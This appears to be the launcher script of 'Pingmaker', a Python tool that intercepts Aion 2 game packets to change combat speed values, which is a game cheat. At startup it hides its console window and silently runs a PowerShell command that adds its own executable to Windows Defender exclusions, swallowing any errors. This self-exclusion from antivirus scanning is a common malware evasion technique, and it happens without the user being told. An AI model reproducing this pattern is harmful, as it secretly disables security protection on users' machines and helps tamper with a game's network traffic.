"""Pingmaker — Latency compensation for Aion 2.

Intercepts game packets and modifies combat speed values
to remove the artificial delay that ping adds between skill uses.
"""

import sys
import os
import ctypes
import subprocess

# Hide console window and set DPI awareness on Windows
if sys.platform == 'win32':
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        pass


def _add_defender_exclusion():
    """Add the running exe to Windows Defender exclusions (requires admin)."""
    exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
    try:
        subprocess.run(
            ['powershell', '-Command',
             f'Add-MpPreference -ExclusionPath "{exe_path}"'],
            capture_output=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass


_add_defender_exclusion()

try:
    import pydivert
except ImportError:
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(
        "Missing Dependency",
        "pydivert not found.\n\n"
        "Ensure the pydivert folder is in the same directory.")
    sys.exit(1)

import tkinter as tk
from skills import load_skills
from ui import PingmakerApp


def main():
    skill_data = load_skills()
    if not skill_data.skills:
        from tkinter import messagebox
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror(
            "Error", "Could not load skills.json\n\nRun generate_skills.py first.")
        return

    root = tk.Tk()
    app = PingmakerApp(root, skill_data)
    root.mainloop()


if __name__ == "__main__":
    main()
